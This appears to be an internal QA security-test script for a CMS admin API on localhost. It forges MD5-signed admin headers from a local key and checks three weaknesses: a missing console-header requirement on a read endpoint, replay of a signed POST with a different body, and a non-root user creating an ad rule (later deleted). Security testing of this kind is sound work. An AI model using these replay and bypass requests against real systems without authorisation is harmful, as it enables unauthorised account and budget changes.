import hashlib, json, time, uuid
from urllib import request, error
KEY=open("data/local-admin.key",encoding="utf-8").read().strip()
BASE="http://127.0.0.1:9901"
def hdrs(name,path,method="GET",secret=KEY,console=False,nonce=None,ts=None):
    h={"admin-name":name,"admin-nonce":nonce or str(uuid.uuid4()),"admin-timestamp":str(ts or int(time.time()*1000))}
    if console: h["admin-console"]="1"
    pairs=sorted((k,v) for k,v in h.items() if k.startswith("admin-"))
    plain=path.split("?")[0]+"&"+method.upper()+"&"+"".join(f"{k}={v}&" for k,v in pairs)+secret+"&"
    h["admin-signature"]=hashlib.md5(plain.encode()).hexdigest()
    return h
def raw(method,path,body=None,headers=None):
    data=json.dumps(body,ensure_ascii=False).encode() if body is not None else None
    hh=dict(headers or {})
    if data is not None: hh["Content-Type"]="application/json"
    req=request.Request(BASE+path,data=data,method=method,headers=hh)
    try:
        with request.urlopen(req,timeout=30) as r: return r.status, json.loads(r.read().decode() or "null")
    except error.HTTPError as e:
        t=e.read().decode()
        try: return e.code, json.loads(t or "null")
        except Exception: return e.code, t

out={"stage":"B7b","checks":[]}
def chk(i,desc,r,ok,detail=None):
    e={"id":i,"desc":desc,"status":r[0],"code":(r[1] or {}).get("code") if isinstance(r[1],dict) else None,"ok":ok}
    if detail: e["detail"]=detail
    out["checks"].append(e); print(i, r[0], (r[1] or {}).get("code") if isinstance(r[1],dict) else r[1], "ok=",ok)

# corrected B7.12: sign the actual path
p="/cms/agent/overseas/accounts?currency=USD"
r=raw("GET",p,headers=hdrs("local-admin",p,console=False))
chk("B7.12","admin-console omitted on overseas read endpoint (correctly signed path)",r,r[0]==200,{"body":r[1] if r[0]!=200 else "ok"})

# corrected B8.3: same signed POST headers, different valid body
p2="/cms/ad/resource/list?pageIndex=1&pageSize=3"
rA=raw("POST",p2,{"adPlatform":["TikTok"]},hdrs("local-admin",p2,"POST"))
post_h=hdrs("local-admin",p2,"POST")
r1=raw("POST",p2,{"adPlatform":["TikTok"]},post_h)
r2=raw("POST",p2,{"adPlatform":["Google"]},post_h)
n1=len((((r1[1] or {}).get("data") or {}).get("list")) or []); n2=len((((r2[1] or {}).get("data") or {}).get("list")) or [])
chk("B8.3","signed POST replayed with a different valid body",r2,r1[0]==200 and r2[0]==200,{"sameBodyRows":n1,"changedBodyRows":n2,"note":"body is not in the signature"})

# B7.16 PoC: non-root alex.chen creates an ad rule WITHOUT admin-console header
body={"name":"QA-AUTHZ-PROBE-alex-chen","type":"BUDGET","actionCycle":"DAY","actionTime":1,"rule":[{"qa":"probe"}],"budgetChange":0.0}
p3="/cms/ad/resource/rule/add"
r=raw("POST",p3,body,hdrs("alex.chen",p3,"POST",console=False))
chk("B7.16c","non-root alex.chen creates ad rule WITHOUT admin-console header",r,r[0]==200 and (r[1] or {}).get("code")==0,{"body":r[1]})
# find it and delete as root with console
p4="/cms/ad/resource/rule/list?pageIndex=1&pageSize=50"
lr=raw("POST",p4,{"name":"QA-AUTHZ-PROBE-alex-chen"},hdrs("local-admin",p4,"POST",console=True))
rows=((lr[1] or {}).get("data") or {}).get("list") or []
found=[x for x in rows if x.get("name")=="QA-AUTHZ-PROBE-alex-chen"]
print("found rule rows:", [(x.get("id"),x.get("name"),x.get("creator")) for x in found])
if found:
    p5="/cms/ad/resource/rule/del"
    dr=raw("POST",p5,{"id":found[0]["id"]},hdrs("local-admin",p5,"POST",console=True))
    chk("B7.16d","QA authz PoC rule cleaned up",dr,(dr[1] or {}).get("code")==0,{"id":found[0]["id"],"body":dr[1],"creator":found[0].get("creator")})
open("tools/qa/out/overseas-sec_B7b.json","w",encoding="utf-8").write(json.dumps(out,ensure_ascii=False,indent=2))
print("saved")
